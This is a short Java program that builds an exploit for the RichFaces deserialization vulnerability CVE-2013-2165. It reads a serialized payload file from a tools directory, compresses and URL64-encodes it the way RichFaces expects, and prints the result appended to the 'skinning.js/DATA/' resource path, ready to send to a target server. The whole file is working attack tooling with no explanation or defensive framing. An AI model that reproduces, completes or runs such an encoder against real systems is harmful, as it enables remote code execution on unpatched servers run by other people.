

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

import javax.faces.FacesException;

import org.ajax4jsf.util.base64.URL64Codec;


public class CVE_2013_2165 {
	
		
	public static byte[] encrypt(byte[] src) {
		try {
			Deflater compressor = new Deflater(Deflater.BEST_SPEED);
			byte[] compressed = new byte[src.length + 100];
			compressor.setInput(src);
			compressor.finish();
			int totalOut = compressor.deflate(compressed);
			byte[] zipsrc = new byte[totalOut];
			System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
			compressor.end();
			return URL64Codec.encodeBase64(zipsrc);
		} catch (Exception e) {
			System.out.println(e);
			return null;
		}
	}
	
	public static byte[] decrypt(byte[] src) {
		try {
			byte[] zipsrc = URL64Codec.decodeBase64(src);
			Inflater decompressor = new Inflater();
			byte[] uncompressed = new byte[zipsrc.length * 5];
			decompressor.setInput(zipsrc);
			int totalOut = decompressor.inflate(uncompressed);
			byte[] out = new byte[totalOut];
			System.arraycopy(uncompressed, 0, out, 0, totalOut);
			decompressor.end();
			return out;
		} catch (Exception e) {
			throw new FacesException("Error decode resource data", e);
		}
	}

	
	public static void main(String[] args) {
		
		try {
			String path = "/root/Tools/payloadDNS/payload5.bin";
			FileInputStream fileInputStream = null;
			File file = new File(path);
			byte[] serializeOutput = new byte[(int) file.length()];
			fileInputStream = new FileInputStream(file);
			fileInputStream.read(serializeOutput);
			fileInputStream.close();
			byte[] out = encrypt(serializeOutput);
			String data = new String(out,"ISO-8859-1");					
			
			System.out.print("org/richfaces/renderkit/html/scripts/skinning.js/DATA/"+data);
		
		}
		catch (IOException ioe) {
			ioe.printStackTrace();
		}
	}	
}


